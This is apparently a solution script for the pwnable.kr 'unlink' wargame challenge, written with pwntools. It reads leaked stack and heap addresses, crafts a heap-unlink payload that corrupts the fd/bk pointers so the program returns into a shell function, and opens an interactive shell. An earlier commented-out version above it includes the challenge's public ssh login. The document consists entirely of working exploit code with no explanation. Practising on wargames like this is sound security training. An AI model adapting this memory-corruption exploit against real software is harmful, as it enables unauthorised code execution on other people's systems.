# #!/usr/bin/env python
# from pwn import *

# returnOffset = 0x10 # ebp-0x4
# shellAddress = 0x080484eb

# # shell = ssh('unlink', 'pwnable.kr', password='guest', port=2222)
# # p = shell.run('./unlink')
# p = process('./unlink')
# print p.recvuntil(': ')
# stackLeak = p.recvuntil('\n', drop=True)
# p.recvuntil(': ')
# heapLeak = p.recvuntil('\n', drop=True)

# returnAddress = int(stackLeak, 16) + returnOffset

# payload = p32(shellAddress) + 'A' * 12 # A buf
# payload += p32(int(heapLeak, 16) + 12) # B fd
# payload += p32(returnAddress) 			# B bk

# pause()
# p.sendlineafter('get shell!', payload)

# p.interactive()

from pwn import *
context.arch = 'i386'    # i386 / arm
r = process(['./unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)        # heap + 8  (new ret addr)
payload += pack(heap + 12)    # heap + 12 (this -4 becomes ESP at ret)
payload += '3333'        # heap + 16
payload += '4444'
payload += pack(stack - 0x20)    # eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)    # edx.

pause()

r.sendline( payload )
r.interactive()